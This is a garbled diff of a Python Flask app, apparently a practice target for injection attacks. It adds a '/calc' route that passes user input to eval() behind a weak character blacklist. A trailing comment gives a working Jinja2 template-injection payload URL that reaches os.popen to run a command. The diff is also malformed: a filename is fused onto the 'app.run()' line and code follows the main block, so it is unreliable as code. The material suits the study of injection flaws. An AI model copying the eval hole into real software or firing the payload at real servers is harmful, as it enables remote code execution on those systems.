@@ -22,6 +22,21 @@ def t():
     return '设置金额成功...'
 if __name__ == '__main__':
     app.debug = True
-    app.run()
-
+    app.run()flaskInjection.py
+black_list = string.ascii_letters + "[]{}\\/ "
+@app.route('/calc', methods=['GET'])
+def calc():
+    if 'expr' not in request.args.keys():
+        return "expr is needed!"
+    expr = request.args.get('expr')
+    for i in black_list:
+        for value in request.args.values():
+            if i in value:
+                return "Hacker"
+    try:
+        if (len(expr) > 27):
+            return "Too long!"
+        return str(eval(expr))
+    except:
+        return "Well......something is wrong?"
     # http://127.0.0.1:5000/test?content={{[].__class__.__base__.__subclasses__()[80].__init__.__globals__[%27__builtins__%27][%27__import__%27](%27os%27).popen(%27calc%27).read()}}
